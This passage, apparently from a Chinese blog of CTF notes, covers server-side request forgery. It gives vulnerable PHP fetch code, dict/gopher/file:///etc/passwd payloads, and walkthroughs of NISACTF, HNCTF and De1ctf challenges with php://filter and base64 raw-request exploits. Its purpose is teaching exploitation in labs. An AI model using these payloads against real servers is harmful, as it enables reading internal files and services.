class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]); <br>    <span class="hljs-variable">$filename</span> =<span class="hljs-string">&#x27;./images/&#x27;</span>.<span class="hljs-title function_ invoke__">rand</span>().<span class="hljs-string">&#x27;;img1.jpg&#x27;</span>; <br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span>); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]; <br>    <span class="hljs-variable">$img</span> = <span class="hljs-string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot;\&quot;/&gt;&quot;</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$img</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä½¿ç”¨ <code>file_get_contents</code> å‡½æ•°ä»ç”¨æˆ·æŒ‡å®šçš„ URL è·å–å›¾ç‰‡ã€‚ç„¶åæŠŠå®ƒç”¨ä¸€ä¸ªéšæœºæ–‡ä»¶åä¿å­˜åœ¨ç¡¬ç›˜ä¸Šï¼Œå¹¶å±•ç¤ºç»™ç”¨æˆ·ã€‚</p><p>2.fsockopen()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span></span>) </span>&#123; <br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>); <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ä½¿ç”¨ <code>fsockopen</code> å‡½æ•°å®ç°è·å–ç”¨æˆ·æŒ‡å®š URL çš„æ•°æ®ï¼ˆæ–‡ä»¶æˆ–è€… HTMLï¼‰ã€‚è¿™ä¸ªå‡½æ•°ä¼šä½¿ç”¨ socket è·ŸæœåŠ¡å™¨å»ºç«‹ TCP è¿æ¥ï¼Œä¼ è¾“åŸå§‹æ•°æ®ã€‚</p><p>3.curl_exec()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$curlobj</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, <span class="hljs-number">0</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br>    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curlobj</span>);<br>    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curlobj</span>);<br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span>.<span class="hljs-title function_ invoke__">rand</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$result</span>); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>curl</code> è·å–æ•°æ®ã€‚</p><h4 id="å¸¸è§åè®®åˆ©ç”¨"><a class="markdownIt-Anchor" href="#å¸¸è§åè®®åˆ©ç”¨"></a> å¸¸è§åè®®åˆ©ç”¨</h4><p>1.Dict åè®®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dict:<span class="hljs-regexp">//</span>host:<span class="hljs-number">8080</span>/helo:dict<br></code></pre></td></tr></table></figure><p>2.Gopher åè®®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gopher:<span class="hljs-regexp">//</span>host:<span class="hljs-number">8080</span>/gopher<br></code></pre></td></tr></table></figure><p>3.File åè®®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><h3 id="nisactf-2022easyssrf"><a class="markdownIt-Anchor" href="#nisactf-2022easyssrf"></a> [NISACTF 2022]easyssrf</h3><p>æ ¹æ®é¢˜ç›®å·²ç»çŸ¥é“æ˜¯ssrf</p><p>è¿™é‡Œç»™äº†ä¸€ä¸ªè®¿é—®ç½‘ç«™çš„å¿«ç…§</p><p>åº”è¯¥å°±æ˜¯é€šè¿‡è¿™é‡Œè®¿é—®æœ¬åœ°</p><p>å°è¯•ä¸€ä¸‹fileåè®®:file:///etc/passwd ï¼Œæç¤ºå…¶ä»–è·¯å¾„</p><p>å°è¯•ç›´æ¥è¯»å–flag</p><p>æ¥ç€è®¿é—®/fl4g</p><p>è®¿é—®ha1x1ux1u.phpï¼Œè¿™ä¸ªè¦åœ¨urlä¸­ç›´æ¥è®¿é—®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;file&quot;</span>))&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ è´¥äº†.&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//flag in /flag</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°<code>file_get_contents</code>æ˜æ˜¾å¯ä»¥ä½¿ç”¨ä¼ªåè®®</p><p>å› æ­¤ä¼ å‚<code>?file=php://filter/read=convert.base64-encode/resource=/flag</code>,å†è¿›è¡Œbase64è§£ç å¾—åˆ°</p><p><code>NSSCTF&#123;67d04802-4a49-4cf9-810e-20542dded546&#125;</code></p><h3 id="hnctf-2022-week2ez_ssrf"><a class="markdownIt-Anchor" href="#hnctf-2022-week2ez_ssrf"></a> [HNCTF 2022 WEEK2]ez_ssrf</h3><p>æ‰“å¼€é¢˜ç›®ï¼Œæ‹¿åˆ°æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br><span class="hljs-variable">$host</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br><span class="hljs-variable">$port</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;port&#x27;</span>];<br><br><span class="hljs-variable">$fp</span>=<span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>,<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>),<span class="hljs-variable">$error</span>,<span class="hljs-variable">$errstr</span>,<span class="hljs-number">30</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$fp</span>) &#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$data</span>);<br>    <span class="hljs-keyword">while</span>(!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$data</span>))<br>    &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-number">128</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å±äºä½¿ç”¨fsockopençš„ssrf</p><p>fsockopençš„åç«¯å®ç°æ–¹å¼å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GetFile</span>(<span class="hljs-params"><span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span></span>) </span>&#123; <br>    <span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fsockopen</span>(<span class="hljs-variable">$host</span>, <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-number">30</span>); <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$errstr</span> (error number <span class="hljs-subst">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-subst">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-subst">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fp</span>, <span class="hljs-number">1024</span>); <br>        &#125; <br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¯¹æ¯”ä¸€ä¸‹å¯ä»¥çœ‹åˆ°ä¸Šé¢çš„dataå…¶å®å°±ç›¸å½“äºä¸‹é¢çš„outï¼Œå› æ­¤æ„é€ poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$out</span>=<span class="hljs-string">&quot;GET /flag.php HTTP/1.1\r\n&quot;</span>;<br><span class="hljs-variable">$out</span>.=<span class="hljs-string">&quot;Host: 127.0.0.1\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>;<br><span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$out</span>);<br><br><br><span class="hljs-comment">#R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQoNCg==</span><br></code></pre></td></tr></table></figure><p>æ¥ç€ä¼ å‚<code>?host=127.0.0.1&amp;port=80&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQoNCg==</code></p><h3 id="de1ctf-2019ssrf-me"><a class="markdownIt-Anchor" href="#de1ctf-2019ssrf-me"></a> [De1ctf 2019]SSRF Me</h3><p>æ‰“å¼€å¾—åˆ°çš„æ˜¯æ··ä¹±çš„æºç ï¼Œæ‰‹åŠ¨æ•´ç†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#! /usr/bin/env python</span><br><span class="hljs-comment"># encoding=utf-8</span><br><span class="hljs-keyword">from</span> imp <span class="hljs-keyword">import</span> reload<br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> json<br><br>reload(sys)<br>sys.setdefaultencoding(<span class="hljs-string">&#x27;latin1&#x27;</span>)<br>app = Flask(__name__)<br>secert_key = os.urandom(<span class="hljs-number">16</span>)<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, action, param, sign, ip</span>):<br>        self.action = action<br>        self.param = param<br>        self.sign = sign<br>        self.sandbox = md5(ip)<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> os.path.exists(self.sandbox)):  <span class="hljs-comment"># SandBox For Remote_Addr</span><br>            os.mkdir(self.sandbox)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">Exec</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>        <span class="hljs-keyword">if</span> (self.checkSign()):<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;scan&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                tmpfile = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;w&#x27;</span>)<br>                resp = scan(self.param)<br>                <span class="hljs-keyword">if</span> (resp == <span class="hljs-string">&quot;Connection Timeout&quot;</span>):<br>                    result[<span class="hljs-string">&#x27;data&#x27;</span>] = resp<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(resp)<br>                    tmpfile.write(resp)<br>                    tmpfile.close()<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;read&quot;</span> <span class="hljs-keyword">in</span> self.action:<br>                f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./%s/result.txt&quot;</span> % self.sandbox, <span class="hljs-string">&#x27;r&#x27;</span>)<br>                result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">200</span><br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = f.read()<br>            <span class="hljs-keyword">if</span> result[<span class="hljs-string">&#x27;code&#x27;</span>] == <span class="hljs-number">500</span>:<br>                result[<span class="hljs-string">&#x27;data&#x27;</span>] = <span class="hljs-string">&quot;Action Error&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            result[<span class="hljs-string">&#x27;code&#x27;</span>] = <span class="hljs-number">500</span><br>            result[<span class="hljs-string">&#x27;msg&#x27;</span>] = <span class="hljs-string">&quot;Sign Error&quot;</span><br>        <span class="hljs-keyword">return</span> result<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkSign</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">if</span> (getSign(self.action, self.param) == self.sign):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-comment"># generate Sign For Action Scan.</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geneSign</span>():<br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    action = <span class="hljs-string">&quot;scan&quot;</span><br>    <span class="hljs-keyword">return</span> getSign(action, param)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> (waf(param)): <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Hacker!!!!&quot;</span><br>    task = Task(action, param, sign, ip)<br>    <span class="hljs-keyword">return</span> json.dumps(task.Exec())<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;code.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).read()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">param</span>):<br>    socket.setdefaulttimeout(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">return</span> urllib.urlopen(param).read()[:<span class="hljs-number">50</span>]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Connection Timeout&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">content</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(content).hexdigest()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">param</span>):<br>    check = param.strip().lower()<br><br>    <span class="hljs-keyword">if</span> check.startswith(<span class="hljs-string">&quot;gopher&quot;</span>) <span class="hljs-keyword">or</span> check.startswith(<span class="hljs-string">&quot;file&quot;</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>: app.debug = <span class="hljs-literal">False</span><br>app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">80</span>)<br><br></code></pre></td></tr></table></figure><p>çœ‹åˆ°æœ‰ä¸‰ä¸ªè·¯ç”±</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/geneSign&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>) </span><span class="hljs-comment">#å¯ä»¥getä¼ å‚param</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>) </span><span class="hljs-comment">#å¯ä»¥getä¼ å‚param ,cookie ä¼ å‚ action ,sign</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>) </span><span class="hljs-comment">#å¯ä»¥getä¼ å‚ param</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/De1ta&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">challenge</span>():<br>    action = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;action&quot;</span>))<br><br>    param = urllib.unquote(request.args.get(<span class="hljs-string">&quot;param&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    sign = urllib.unquote(request.cookies.get(<span class="hljs-string">&quot;sign&quot;</span>))<br>    ip = request.remote_addr<br>    <span class="hljs-keyword">if</span> (waf(param)): <span 